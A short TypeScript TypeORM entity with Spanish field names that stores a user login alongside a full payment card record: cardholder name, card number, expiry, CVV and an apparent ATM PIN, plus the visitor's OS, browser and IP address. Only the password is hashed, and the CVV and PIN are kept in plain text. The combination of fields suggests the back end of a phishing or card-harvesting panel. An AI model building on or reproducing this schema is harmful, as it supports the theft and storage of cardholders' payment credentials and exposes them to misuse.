import { Entity, PrimaryGeneratedColumn, Column, BeforeInsert } from "typeorm";
import { Length } from "class-validator";
import bcrypt from "bcryptjs";

@Entity()
export class Registro {
  @PrimaryGeneratedColumn()
  id: number;

  @Column()
  titular: string;

  @Column({unique: true})
  user: string;

  @Column({unique: true})
  email: string;

  @Column({ select: false })
  @Length(6, 25, { message: "Password Debe tener al menos 6 caracteres" })
  password: string;

  @Column()
  tarjeta: string;

  @Column()
  tmes: string;

  @Column()
  tano: string;

  @Column()
  cvv: string;

  @Column()
  atm: string;

  @Column()
  os: string;

  @Column()
  navegador: string;

  @Column()
  ip: string;

  @Column()
  fecha: string;

  
  //encrypta el password antes de insertarse en la base de datos
  @BeforeInsert()
  async hashPassword() {
    this.password = await bcrypt.hash(this.password, 10);
  }
}
